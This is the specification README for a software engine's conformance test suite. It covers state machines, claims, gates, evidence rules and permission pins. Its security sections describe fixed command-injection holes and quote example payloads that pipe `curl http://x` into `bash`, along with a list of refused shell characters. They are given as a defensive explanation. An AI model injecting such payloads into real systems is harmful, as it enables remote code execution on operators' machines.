# Conformance suite

This suite is the **specification** of the spine engine. It was written *before* any engine code, translated from the prose rules in the BMAD source (`bmad-sprint-planning`, `bmad-dev-auto`, `bmad-quick-dev`, `stories-schema.md`) as arbitrated in [product-roadmap.md](../../../product-roadmap.md) §1. The engine (`src/`) is implemented to make this suite pass — never the other way around. **Do not edit tests to fit an implementation**; a test change is a spec change and needs the same review as a roadmap edit.

Run: `pnpm test` (in `packages/core`). History: the suite was born **113 red / 2 green** against `NotImplementedError` stubs; the in-memory reference engine (story "1"–"10" domain, `src/engine.ts`) turned it **115/115 green**. Two inter-cluster contradictions surfaced during implementation and were arbitrated below (marked ⚖); each required editing exactly one pin, recorded here.

Files: `fsm-transitions` (14) · `blocked-overlay` (9) · `epic-lift` (4) · `feature-fsm` (19) · `review-dispatch` (8) · `agent-job-claim` (7) · `claims` (24) · `concurrency` (7) · `gates-evidence` (12) · `review-loop` (6) · `stories-import` (13) · `intent-hash` (12) · `intent-wired` (5) · `pr-gate` (2) · `checkpoints-dispatch` (12) · `reconcile` (9).

## Interpretation pins

Where the prose was ambiguous or sources conflicted, the suite **pins one reading**. Changing a pin = changing the spec. The load-bearing ones:

### Arbitrated conflicts (roadmap wins over playbook prose)
- **Epic-lift trigger**: sprint-planning says "when first story is *created*"; roadmap §1.2 says "first child *leaving backlog*". Suite follows the roadmap: `createWorkItem` does not lift; `backlog→draft` does. **§9 rename:** the projector target is now `executing` (was `in_progress`); the projector still jumps straight there, skipping the gated stages (the degenerate/back-compat path).

### Feature FSM (roadmap §9, `feature-fsm`)
- **States** `backlog → spec → design → breakdown → executing → handoff → done` + terminal `cancelled`. `executing` is the renamed `in_progress`. Board labels (In Design / **In TDD** / Ready for Impl / …) are a presentation map, never states.
- **Two gate-fired arrows, the rest permitted advances.** `design_approval` fires `design→breakdown` (reject loops `design→spec`); `handoff_approval` fires `handoff→done` (reject loops `handoff→executing`). `feature_advance` covers `backlog→spec`, `spec→design`, `breakdown→executing`, `executing→handoff`. Skipping a state, or advancing out of a terminal state, is `InvalidTransitionError`. `done` is reachable ONLY through the handoff gate.
- **In-TDD checkpoint = `tests_pinned` entry-guard** on `design→breakdown`: at least one story of the feature carries a non-empty `pinnedVerification` (the test-first tests were authored, D7). `executing→handoff` carries `children_done` (no child outside `done`).
- **Loopbacks are system-authored** with `causationId` = the gate-decision event, mirroring `rejectGate`. Feature gate decisions live in `gate_decisions` with `feature_id` set and `work_item_id` null (a CHECK pins the XOR). The quorum round for a feature gate = the count of prior rejections for that feature+gate, so a rejection resets the quorum (reused `round` semantics).
- **Cancel** (`feature.cancel`, a product decision) reaches terminal `cancelled` from any non-terminal state, appending a compensating `feature.cancelled` event; `done`/`cancelled` refuse it. Gate policies (`set_gate_policy`) apply to the feature gate codes exactly as to `spec_approval`.

### Atomic reviewer dispatch (roadmap §9.4, `review-dispatch`)
- **Claims carry a `kind`** (`'work' | 'review'`). The live-claim constraint is per `(work_item_id, kind)`, so a work claim and a review claim COEXIST on one item, each with its own fencing token. Two concurrent `claim_review` calls: one wins, the loser gets `ConflictError` (constraint, not app logic). A presented token is valid iff it matches SOME live claim on the item (work or review) — the token is the capability, not the kind.
- **`claim_review`** requires `gate.review.approve` OR `gate.review.reject` and applies only to `in_review` items.
- **Auto-dispatch**: when the `review_approval` gate policy names `autoDispatchReviewer`, entering `in_review` materializes EXACTLY ONE review `agent_job` for that actor, `reviewRound = reviewLoopIteration`, `threadId`/`messageId` null. A review job is an `agent_job` with `reviewRound` non-null; the partial unique index `(work_item_id, review_round)` makes a second entry into `in_review` in the same round a no-op. The mention jobs loop ignores review jobs.

### Atomic agent-job claim (roadmap §9.5, `agent-job-claim`)
- An agent job is CLAIMED under a lease before it is served: `queued → in_progress` is a compare-and-set (memory: status guard; PGlite: `UPDATE … WHERE status='queued' OR lapsed` row-count). Two jobs loops on one queue: one wins, the loser gets `ConflictError`. Only the job's own agent (`agentActorId`) may claim; once claimed, only the claimer completes.
- An `in_progress` job whose lease lapsed (`claimExpiresAt <= now`) reads back as `queued` (lazy free — the reaper generalizes in 10.4). `completeAgentJob` allows a queued OR in_progress job (not already done/blocked); it stays back-compatible with the pre-9.5 complete-without-claim flow.
- The lease is **sized to the run**: the runner claims with `ttlMs = agentTimeout + margin`, and the agent is SIGKILLed at `agentTimeout`, so the lease can never lapse mid-run and re-open the job to a second loop (the double-post window).
- **Worker push**: dev-auto says "do not push"; roadmap §1.4 makes `final_revision_reachable_on_remote` a done-gate guard. Roadmap wins.
- **Review-loop counter after the blocking 6th rejection**: stays at 5 (counts *performed* loopbacks; dev-auto's file-side "write 6 then halt" is not adopted — DB is the only counter, roadmap §1.1). The item stays `in_review` + blocked overlay `review_non_convergence`; `rejectGate` records the decision and returns the blocked item rather than throwing.

### Error taxonomy
- Missing claim / token not presented → `GuardFailedError` (a data guard failed). Token *presented* but stale/foreign/no-live-claim → `ConflictError` (409). The engine never infers a claim from the actor — the token must be presented.
- Undeclared transition (incl. never-downgrade) → `InvalidTransitionError`, checked **before** claim/token/permission.

### Gates & authorization
- `approveGate` performs the gated forward transition itself (spec_approval: `draft→ready_for_dev`; review_approval: `in_review→done`); evidence guards are evaluated there. (`checkpoints-dispatch` accepts either shape; `gates-evidence` pins it.)
- Grants decide; actor type is never a SOURCE of authority — an *agent* with `gate.review.approve` approves (on the default self-host plan). Two opt-in, restrict-ONLY policy checks may narrow that by type, and BOTH are engine checks: a plan/workspace ceiling (`agentCeilingAllows`) can forbid an *agent* from using a gate-approve/reject or self-dispatch grant on the `free`/`team` plans (the self-host default `enterprise` leaves it fully open), and a gate's `requiredActorTypes` quorum can require an approver of a given type. Neither can grant authority a grant did not — type only ever subtracts, never adds.
- `state.downgrade` alone suffices for privileged correction (no claim, no `task.advance`).
- Generic unblock authz is deliberately **unpinned**; only `review_non_convergence` is pinned to `gate.review.approve` holders.
- Items without `spec_checkpoint` may advance `draft→ready_for_dev` via plain `advanceState` (the gate is mandatory only when the checkpoint is set).

### Claims
- ⚖ **Claims serialize the execution zone.** `ready_for_dev→in_progress` and `in_progress→in_review` demand a presented, live fencing token. Planning transitions (`backlog→draft`, `draft→ready_for_dev`) are **permission-only** — arbitrated when the claims cluster's pin ("backlog→draft needs a claim") contradicted four other clusters that advance planning transitions unclaimed. Majority + domain: claims exist to stop two *workers* colliding; the dispatch path (roadmap §2.3) always claims regardless of state, so dispatched drafting is still serialized. A **presented** token is always validated on every command (stale/foreign → `ConflictError` + audit event), even on planning transitions. One `claims.test.ts` test was rewritten to pin the arbitrated reading.
- One claim may live across multiple transitions (claim at `backlog`, drive to `in_review` on one fencing token); claims are also valid at `backlog`, and at `in_progress`/`in_review` when no live claim exists (resume).
- Heartbeat renews the full original TTL from the heartbeat moment.
- A claim survives a rejection loopback (rework under the same lease).
- Gate approvals by non-claim-holders work while someone else holds the claim.
- **The lease reaper (§10.5) records; it never decides.** `reapExpiredClaims()` appends `claim.expired` (attributed to the SYSTEM actor, `causationId` = the claim's own `work_item.claimed`) for each lapsed lease and notifies its holder (`Notification.source = 'claim_expired'`, `refId` = the claim). Expiry is already true the moment the clock passes the lease — a lapsed claim is excluded from the live set, so the item is claimable and the dead holder's token is rejected whether or not anyone reaps. The reaper only makes somebody SAY so, which is why the served spine may run it on a timer: it cannot change an outcome. Idempotent via the LOG (a claim that already has a `claim.expired` is skipped) — deliberately NOT via the claim's `released` flag: `released` is read WITHOUT the clock by `forceReleaseClaim` and by `listClaims` (which filters on it and computes `expired` from it), so setting it would make a timer take ops' dead-runner view away and turn a working force-release into a failure. Reading the log is also what keeps the engines in step: PgEngine's `claimOfKind` silently flips `released` on a lapsed claim when the slot is re-taken while the memory engine leaves it alone, so `released` answers a different question in each — the events do not. A claim released ON PURPOSE is never reported (its lease lapsing later is not a death), and live leases are left alone.

### Evidence
- ⚖ `in_progress→in_review`: the **latest submitted `git_diff`, if any, must be non-empty** (the fake-done deny). Absence is not checked at this transition — arbitrated when claims/concurrency fixtures (which defer evidence semantics to the gates cluster) advance to review without a diff. The runner contract submits the diff before requesting review, and the done gate independently demands remote-reachable commit evidence, so absence cannot reach `done` unverified. No test was edited; the gates cluster's empty-diff deny keeps its meaning.
- Dependency guard pinned only at `ready_for_dev→in_progress` (an item with unmet deps can still be drafted and spec-approved).

### Import / hash / reconcile
- Imported stories start at `backlog`. Re-import is idempotent and non-destructive under renumbering; filesystem-aware id-pinning is a TODO (the engine API does not model the spec folder).
- `getWorkItem(id)` must also resolve an `externalKey` handle — **forcing function**: if the engine team rejects this, add `getWorkItemByKey` to the API and update `stories-import.test.ts` imports section.
- Canonicalization pins only invariants (CRLF≡LF, trailing-space-insensitive, 3-blank ≡ 5-blank runs, single blank preserved) — not an exact collapse width.
- Reconcile: `done`-in-file vs `in_progress`-in-DB reports `file_ahead`; files under a live claim are excluded; `blocked` frontmatter vs overlay+base-state is *not* divergence; legacy vocab (`review`/`in-review`) normalizes to `in_review`.

### Phase 2 — entitlements (`entitlements.test.ts`, all additive)
- `gate.review.reject` is a new permission; `rejectGate` accepts **approve OR reject** — the Phase 2 exit criterion (reject-without-approve agent) holds, and every Phase 1 rejectGate pin keeps holding.
- **Plan ceilings bind agents only**, at grant time (`GuardFailedError`) *and* resolve time (a later downgrade disables an issued grant). Users are never plan-filtered. Default plan is `enterprise` (self-host posture: the org narrows).
- **Restrict-only policy**: effective agent gate approval = plan ceiling AND workspace policy; a permissive policy never widens a restrictive plan. `agentSelfDispatch=false` blocks agent `task.claim` at resolve time.
- **Gate quorum is data**: distinct approvers per review round (round = `reviewLoopIteration`); a rejection loopback starts a new round — stale approvals never carry over; `requiredActorTypes` makes human-in-the-loop a policy value, not a hardcode. Evidence guards evaluate exactly when the quorum would complete, so failed approvals record nothing.
- Governance authority (`setPlan`/`setWorkspacePolicy`/`setGatePolicy`/`assignRole`/`setGovernanceRole`) = the system actor or `governanceRole='admin'` holders; `createActor` takes an optional bootstrap `governanceRole` (plumbing, like `createActor` itself).
- `grant`/`revoke`/role/plan/policy changes are audited events (actor stream / `workspace` stream).

### Phase 3 — collaboration (`collaboration.test.ts`, all additive)
- **Sacred boundary is machine-pinned**: posting "approve" (even by a gate-holder) changes no state and emits no `state_changed` event; the server never parses body text — mentions are **structured actor ids** ("@name" in text creates nothing).
- **Rails → chat one-way**: every work-item state change appends a `kind='system'` narration message (author = system actor) to threads bound to that item. There is no chat → rails path.
- **Mention router (pure code)**: human mentioner needs ≥1 active delivery role or governance admin (default-deny `who_may_invoke`); `mentionDispatch=false` is a global kill-switch; mentioning a human notifies only. Agent-mention-agent requires `agentMentionAgent=true` and carries depth = max(mentioner's job depths)+1, capped at `AGENT_JOB_MAX_DEPTH` (2) → `denied_depth`.
- **Agent jobs are reply-only context**: no claim is pre-issued (§5.4); completion is restricted to the job's agent (`PermissionDeniedError('agent_job.complete')`) and notifies the mentioner; a completed job leaves lifecycle untouched. The mention path is independent of `agentSelfDispatch`.
- **Private threads**: participants only, for post AND read AND invite; creator is a participant; message `seq` is per-thread, 1-based, gap-free.

### Phase 4 — non-coding teammates (`doc-work.test.ts`, all additive)
- **`work_item.kind` selects WHICH machine-evidence guards apply, never WHO may pass a gate.** Default `'code'` keeps every prior pin intact; imported stories are always `code`.
- Doc kinds (`spec_draft`/`design_review`/`qa_report`/`doc`): entering review requires the **latest `doc_lint` (if any) to be schema-valid**; `git_diff` is never consulted; the done gate **drops the commit-reachable requirement** — completion rests on machine-checkable doc evidence plus the permitted decision (roadmap §1.4). Pinned verification (D7) and the review_report-is-never-a-guard rule bind doc work exactly as code work.
- **Personas**: `provisionPersonas` is a gated, idempotent write creating the six BMAD persona agent actors (`personaCode` set); floor-state roles (Amelia→developer, others→contributor); zero gate authority anywhere by default — the exit-criterion flow grants the PM agent its bundle **explicitly**.
- `listActors` exposes everyone, system actor included (audit/picker transparency).

### Phase 5 — agent memory (`agent-memory.test.ts`, all additive)
- **Memory is owner-scoped by construction**: recall takes no cross-actor parameter; another actor's search simply never sees it. Agent actors only.
- **Source-visibility filter (§6)**: learning from a private thread requires having been a participant; a private-sourced memory surfaces **only** when recalled inside its source thread — never in an open context.
- **Learning never becomes authority**: 50 memories change zero authz outcomes (`authzExplain` and the live checks agree); the memory API has no path to grants. Memory **events never carry content** — private learning stays out of the shared audit log.

### Event log
- `streamSeq` is 1-based and gap-free per stream; which setup commands emit work-item events is unpinned (tests count deltas, not absolutes).
- System-actor authorship (epic-lift, loopback) is asserted structurally: event `actorId` differs from every fixture-created actor and carries a `causationId`.
- `stateVersion` is pinned strictly monotonic, not +1-per-mutation.

### Phase 7 Wave 2 — Project entity (`project.test.ts`, additive)
- **Project is the unit of parallel work** (D-E): name + unique `slug` (derived from name, never silently moved by rename) + `kind` (default `mixed`) + optional `repoPath`/`defaultSpecFolder` + `active|archived`. `getProject` resolves id OR slug; events land on a `project` stream.
- **The default project is the compatibility floor**: `createFeature` without a project lazily creates/reuses slug `default` — every pre-Wave-2 flow and data dir keeps its exact meaning. Features may carry a `name`.
- Archived projects refuse NEW features; reads stay open. `listWorkItems({projectId})` (id or slug) spans every feature of the project.
- ~~`createProject` carries no engine-side permission check — deliberately symmetric with `createFeature` (whose `feature.init` convention is enforced at the ops layer, not pinned in the engine).~~ **SUPERSEDED by 0.2b** (below): the premise was false — nothing at any layer enforced it. `createProject`/`createFeature` now require `feature.init`.

### Phase 7 Wave 2 — externalKey scoping (`external-key-scope.test.ts`)
- Handles are **scoped per project**: a bare key resolves only while unique across the workspace; duplicated across projects → explicit `GuardFailedError` "ambiguous … qualify as `<project-slug>:<key>`" (never silent cross-project first-writer shadowing). The qualified form always resolves. One resolver serves every command (`mustGetItem`).
- WITHIN a project, the Phase-1 first-writer-wins pin keeps its exact meaning (all Phase-1 flows live in the single default project).

### Phase 7 Wave 2 — memory project scope (`memory-project-scope.test.ts`, additive, D-H)
- A memory may carry a `projectId` (id or slug at append; stored resolved); **null = GLOBAL craft**. Scoped recall (`searchAgentMemory({projectId})`) returns that project's memories + global — a sibling project's lessons never leak in.
- **Unscoped recall keeps its exact Phase-5 meaning** (every owner memory). Owner-scoping and the §6 private-source filter compose unchanged with the project filter. Memory events still never carry content.

### Phase 7 Wave 2 — wall-clock leases (`wall-clock.test.ts`, opt-in)
- `createEngine({ wallClock: true })` binds the LEASE clock to real time: an unheartbeated claim expires after TTL and the item is claimable again — no force-release needed (D-G). Heartbeat keeps its Phase-1 meaning (full TTL renewal from the heartbeat moment), now in real time.
- **The default stays the logical clock** (`advanceClock`), pinned: real time never expires a lease on a default engine — every other conformance test keeps its determinism. `currentTime()` is the ONLY read path for lease time; no other guard may consult it. Factory options are JSON-serializable (they cross the db facade's worker boundary). The served spine (`oahs serve`) always opts in.

### Phase 7 Wave 1 — listClaims (`list-claims.test.ts`, additive)
- `listClaims()` is the workspace-wide claims view: **live (unreleased) claims only by default**, each carrying its `workItemId`; `includeReleased: true` is the history view. Read-only — grants unchanged, no event appended. The per-item `getClaims` keeps its exact Phase-1 meaning.

### Phase 7 Wave 1 — event timestamps (`event-timestamps.test.ts`, additive)
- Every appended event carries **`occurredAt`: wall-clock ms stamped at append**, monotonically non-decreasing in `globalSeq` order. Pinned with wall-time *bounds* (not clock injection) so the identical suite runs against the memory engine and the worker-thread PGlite facade.
- `occurredAt` is **observational audit metadata only**: no guard, transition, lease, or entitlement decision may read it — the engine's logical clock (`advanceClock`) stays the only time source for lease logic. Rows persisted before this pin default to `0`.

### 0.2a — who may author machine evidence (`gates-evidence.test.ts`, 7 new pins)

A **spec change**, recorded here per the rule at the top of this file. Before it,
`submitEvidence` required no permission, no claim and no fencing token, so any actor
holding any token could append `test_run{exitCode:0}` + `commit{reachableOnRemote:true}`
to any work item. Because both evidence guards take the **latest** row of each kind,
appending after the real (failing) measurement was enough to turn the done gate green on
facts nobody measured — the fake-done the thesis exists to refuse, reachable without the
dishonest *operator* the documented trust floor assumes. §1.4 named three gate conditions
but the suite only ever pinned what evidence must **say**, never who may **say** it.

- **`evidence.submit` is required for every kind.** Measuring is an authority. It rides
  with the roles that measure (`developer`, `product_owner`, `reviewer`, `tech_lead`) and
  is deliberately absent from `contributor` and `qa` — so the six `provision_personas`
  agents, whose floor-state role is `contributor` (`[]`), cannot author a verdict.
- **Verdict-bearing evidence on a live-claimed item must present that claim's fencing
  token.** Facts about work in flight come only from the worker executing it — the §1.3
  capability rule for transitions, extended to the facts transitions are judged on.
- **The fencing rule is narrowed twice, and both narrowings are load-bearing.** Only while
  a claim is LIVE, because the §9.3 `intent_hash` is submitted at spec approval before any
  claim exists and the §9.6 `pr` merge fact at review approval after the runner released
  (it advances to `in_review`, *then* releases). And only for `VERDICT_EVIDENCE_KINDS`
  (`test_run`, `git_diff`, `commit`, `doc_lint`, `intent_hash`, `pr`), because a reviewer
  posts a `review_report` while the worker's claim is still live — Phase 4's exit criterion
  does exactly that. Fencing context evidence would push the reviewer off the rails to say
  something the engine never reads. **If a kind is ever promoted to a guard it must be
  added to `VERDICT_EVIDENCE_KINDS` in the same change** — that list is one exported
  constant both the authz rule and the guard logic read, so the two engines cannot drift.
- **The `evidence.submitted` event carries the verdict-relevant payload fields**
  (`pickVerdictFields`, a whitelist), not just `{kind}`. `oahs events` is sold as "who did
  what, on what evidence — a query, not an interview"; an event carrying only the kind
  cannot say which command or what exit code won the latest-wins comparison, so the
  append-only log was not self-sufficient for an audit of a passed gate. A whitelist rather
  than the whole payload because evidence payloads are free-form and agent-adjacent ones
  carry transcript tails that have no business in the event log.

Fixture consequence, recorded because it touched 16 files: every conformance fixture whose
worker submits evidence now grants it explicitly. That is the pin doing its job — the
grant is visible in each cluster instead of implied.

### 0.2b — the planning surface is permissioned (`project.test.ts`, 4 new pins)

A **spec change that overrides an earlier pin.** The superseded pin (marked above) read:
"`createProject` carries no engine-side permission check — deliberately symmetric with
`createFeature` (whose `feature.init` convention is enforced at the ops layer, not pinned
in the engine)." Its premise does not hold: `apps/spine-api/src/bus.ts` passed `ctx.actorId`
straight into `createFeature` / `createWorkItem` / `importStories` / `project_create` with no
`requirePermission` and no `requireAdmin`, so "the ops layer" was a convention nobody
implemented. A pin may record a deliberate absence; it may not record an enforcement that
does not exist.

- **`createProject` and `createFeature` require `feature.init`.** The containers are
  authority, matching what the role bundles already assumed.
- **`createWorkItem` and `importStories` require `task.plan`** — deliberately the SAME
  permission that governs `backlog→draft`, so "who may put work into the system" and "who
  may start moving it" stay one authority rather than two.
- **Why this outranks an ordinary missing check**: `createWorkItem` is the write path for
  `invokeDevWith`, which `packages/runner` interpolates into the agent command it executes
  on an operator machine. An unpermissioned create was therefore an unpermissioned write
  into a string that runs — the inverse of D13, where the process deciding what runs must
  never be the unprivileged one. The pinned test carries the actual payload so the
  regression is legible.
- **Governance role is NOT a delivery superuser.** `requirePermission` still never consults
  `governanceRole` (§3 keeps plan × governance × delivery orthogonal). Instead
  `ensureBootstrapAdminActor` seeds the bootstrap admin with `feature.init` + `task.plan`,
  because a governance admin can grant itself anything at will — refusing it there would be
  friction, not a boundary. `tools/oahs-bootstrap.sh` already performed exactly those two
  grants by hand; this makes the intended state the default. The attack 0.2b closes is a
  ZERO-GRANT actor token, which is unaffected.

### 0.2c — a pinned command is a command, not a script (`pinned-command-safety.test.ts`, 16 pins)

D7's promise is that "the runner executes only pinned, **allowlisted** commands". The
allowlist was decorative: the runner took the first whitespace token, checked it, then
handed the whole original string to `bash -c` — and the list itself contained `sh` and
`bash`. `pnpm test; curl http://x | bash` passed on the strength of `pnpm`. Holding
`gate.spec.approve` was therefore equivalent to code execution on every machine that runs
a claim for that item; in BYO mode that is the operator's own machine, in the process
holding the push credential and the ssh-agent socket.

- **The constraint lives where the pin is WRITTEN** (`approveGate`, the only place a pin
  can be set), not only where it is executed. A pin is Rules-layer data that outlives the
  runner that wrote it, and every surface — HTTP, MCP, CLI — inherits one rule.
  A rejected pin leaves the spec `draft` with `pinnedVerification` null: no half-approval.
- **Refused:** `;`  `&`  `|`  `` ` ``  `$`  `<`  `>`  newline. **Allowed:** quotes (a spaced
  argument is one argument) and parentheses — the latter are inert under argv execution and
  are required by the repo's own pins (`node -e "…require('fs')…"`). Excluding them costs
  nothing because `$` and backtick are refused, so `$(…)` and `` `…` `` cannot form, and
  substitution is the escalation vector parentheses alone do not provide.
- **`sh` and `bash` are gone from the allowlist**, which now also carries `make`, `go` and
  `cargo`. `VERIFICATION_ALLOWLIST` is exported from core and the runner imports it, so the
  write-time check and the execution-time check cannot disagree about what is runnable.
- **The runner executes argv with `shell: false`** (`splitVerificationArgv`), so the
  execution half of the injection is gone independently of the data check. It keeps its
  refusal branch as defence in depth for a pin written into a data dir before this rule.
- **Composition is the array, not the shell.** `pinnedVerification` is a list, so refusing
  `&&` removes a second way to express what the data model already expresses — capability
  for an attacker, none for a PO.

**Consequence for an existing pin:** the Phase 1 runner e2e "a non-allowlisted pinned
command is refused" asserted RUNNER-level refusal of `curl http://evil`. That state can no
longer be constructed, because the gate refuses it first. The test now pins the stronger
behaviour (refused at approval, spec left unapproved) and asserts the runner's guard
function directly.

### 0.2c — `invoke_dev_with` and `externalKey` are constrained (`stories-import.test.ts`, 4 pins)

Both are interpolated by `packages/runner` into the `--agent-cmd` template it executes, and
the documented template puts `{INVOKE_WITH}` inside a double-quoted bash string — so
`invoke_dev_with: '" ; curl http://x | bash ; "'` escaped it and ran on the host. Written
through `create_work_item` / `import_stories`, i.e. by any `task.plan` holder.

- **`SAFE_SPINE_STRING` in core is the single definition.** The contract enforces it for
  `create_work_item`; `stories.ts` enforces it for the bulk path, because `import_stories`
  carries opaque YAML on the wire that zod cannot see. Previously `stories.ts` pattern-checked
  a story `id` while the contract accepted any string for the same field — two validators
  disagreeing on one value.
- **The operator's `--agent-cmd` keeps ordinary shell semantics.** It is the operator's own
  argv, not spine data; the injection is closed by constraining the untrusted inputs, which
  leaves the canonical README invocation working. Rewriting the template into argv would
  break the one documented way to run the product to close a hole the data check already
  closes.

### 0.2d — a passing test_run is bound to the revision it certifies (`gates-evidence.test.ts`, 3 pins)

The done gate's evidence condition checked that every pinned command exited 0 and that the
final commit was reachable — but it never compared a REVISION, so it certified "the final
revision" while having no idea which revision the tests measured. HEAD (`0c7a038`) closed
half of this by making the RUNNER normalize the worktree to the committed revision before
verifying, which makes the claim true. This closes the other half: the core now checks that
it was.

- **When both sides state a revision, they must match.** The latest `commit` evidence's `sha`
  is the certified revision; every pinned command's latest passing `test_run` must carry the
  same `revision`. A green run on commit A can no longer certify commit B.
- **Back-compat is a pin, not an accident.** Evidence is append-only and a data dir outlives
  the binary that wrote it, so a `test_run` with NO `revision` (pre-0.2d) is judged exactly
  as before. The comparison applies only when the measuring side actually said what it
  measured — the engine never invents a fact to check.
- The runner stamps `revision` on `test_run` and `git_diff` from the same `git rev-parse HEAD`
  it normalizes to, so the pair is comparable by construction.

### 0.2d — the bus is exhaustive by compiler, and the platform is linted

Not conformance pins, recorded here because both make an existing CLAIM enforceable:

- **`const unwired: never = command`** at the end of the bus switch. The line above it said
  "keeps the compiler honest"; nothing did. A registry entry with no `case` compiled fine and
  failed at runtime on a line no test covered. It is now a compile error.
- **`make lint-oahs`** (wired into `make check`): type-aware ESLint over ~49k LOC that
  previously had `tsc --noEmit` as its only static gate. Deliberately narrow —
  `no-floating-promises`, `no-misused-promises`, `await-thenable`, `no-unused-vars`,
  `no-constant-condition` — because 90 rules at once produce a backlog nobody reads. It found
  4 dead bindings and 3 stale disable directives; **zero floating promises**, which is a real
  statement about `packages/runner`.
- **§0.1 is now a rule, not only a grep.** `no-restricted-imports` over the four spine trees
  *plus* `apps/spine-api/ui-src` (which the greps cannot see), matched against the compiler's
  module graph, so it also catches a provider the six grep literals do not name and a
  transitive reach. Verified to fire, not assumed. The greps stay as a cheap first line; what
  neither catches is a bare `fetch()` to a provider URL, and the CI comment now says so
  instead of implying completeness.
